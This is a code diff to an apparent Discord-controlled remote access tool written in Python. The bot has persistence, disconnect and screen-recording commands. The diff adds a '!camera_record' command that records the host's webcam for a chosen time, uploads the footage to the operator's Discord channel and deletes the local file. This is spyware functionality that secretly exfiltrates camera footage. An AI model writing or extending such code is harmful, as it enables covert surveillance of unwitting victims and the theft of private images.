@@ -6,6 +6,7 @@ import threading
 import os
 import os.path as osp
 import platform
+from features.camera_record import camrecord
 # Features importing
 from features.func import *
 from features.persistence import persist
@@ -76,6 +77,9 @@ def main():
         elif re.match(r'!video_record \d+[smh]',message.content):
             record_time = re.findall(r'\d+[smh]$', message.content)[0]
             await videorecord(await bot.get_context(message), record_time)
+        elif re.match(r'!camera_record \d+[smh]',message.content):
+            record_time = re.findall(r'\d+[smh]$', message.content)[0]
+            await camera_record(await bot.get_context(message), record_time)
         elif re.match(r'!disconnect',message.content):
             await disconnect(await bot.get_context(message))
         elif re.match(r'!safe_disconnect',message.content):
@@ -219,6 +223,16 @@ def main():
             return
 
         recording_path = video_record(record_time)
+        print(f"recording path: {recording_path}")
+        await ctx.send(file=discord.File(recording_path))
+        os.remove(recording_path)
+
+    @bot.command()
+    async def camera_record(ctx, record_time):
+        if ctx.channel.name != generate_uuid():
+            return
+
+        recording_path = camrecord(record_time)
         print(f"recording path: {recording_path}")
         await ctx.send(file=discord.File(recording_path))
         os.remove(recording_path)
